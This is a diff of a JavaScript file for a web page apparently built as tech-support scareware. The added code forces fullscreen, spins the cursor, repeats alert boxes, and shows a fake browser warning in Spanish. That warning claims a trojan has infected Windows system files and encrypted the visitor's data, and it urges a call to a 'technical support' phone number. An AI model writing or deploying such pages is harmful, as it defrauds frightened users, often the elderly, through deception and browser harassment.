@@ -4,7 +4,6 @@ function virus(){
 
 	bloqueo();
 	ocultar();
-	//maximizar();
 }
 
 
@@ -49,18 +48,18 @@ function maximizar(){
 	window.open("propagar.html", "VIRUS");
 }
 
-function cargaPaginas(){
-   for(var i = 1; i >= 1;i++){
-     //window.open("inicio.php");
-     
- }
+function ocultar2(){
+  document.getElementById('virus').style.backgroundColor = "black";
+  document.body.style.backgroundImage = "url('./images/bk.jpg')";
+  document.getElementById('pagina').src = "./images/rw.jpg";
 
 }
 
 function ocultar(){
 	document.getElementById('virus').style.display = 'block';
 	document.getElementById('info').style.display = 'none';
-	document.body.style.backgroundImage = "url('./images/bk.jpg')";
+  document.getElementById('virus').style.backgroundColor = "#0202ac";
+	document.body.style.backgroundColor = "#0202ac";
 
 }
 
@@ -78,16 +77,36 @@ function launchFullscreen(element) {
 
   setTimeout(function() {
     poner();
-	}, 1000);
+    voltear();
+	}, 3000);
 
 }
 
 function poner(){ 
 var paso;
-for (paso = 0; paso < 100; paso++) {
-  // Se ejecuta 5 veces, con valores desde paso desde 0 hasta 4.
-  alert('Virus');
+for (paso = 0; paso < 10; paso++) {
+  abrirVirus();
 };
+ocultar2();
+}
+
+function abrirVirus() {
+   document.body.style.backgroundColor='#ff0000';
+   var mensaje = "ALERTA DEL NAVEGADOR DE INTERNET\nSE HA DETECTADO UNA AMENAZA\n\nTipo: Troyano\nMalware: Win32:Trojan[TRj21]"        
+   +"\n\nArchivo infectados: \n C:\\Windows\\System32\\autoplay.dll\n C:\\Windows\\System32\\batt.dll\n" 
+   +"C:\\Windows\\System32\\bcdboot.dll\n C:\\Windows\\System32\\batmeter.dll\n\nEste malware ha infectado su ordenador." 
+   +"Los datos han sido encriptados.\n\nNo realice ninguna acción, ya que pondrá en peligro todos sus datos.\n\nContacte con el soporte técnico llamando al 902-231545\n\n"
+   alert(mensaje);
+ }
+
+function voltear(){
+var cursores = new Array("e-resize","ne-resize","n-resize","se-resize");
+var i = 0;
+document.body.style.cursor=cursores[i];
+i++;
+if (i==cursores.length) 
+  i=0
+setTimeout("voltear()",75);
 }
 
 
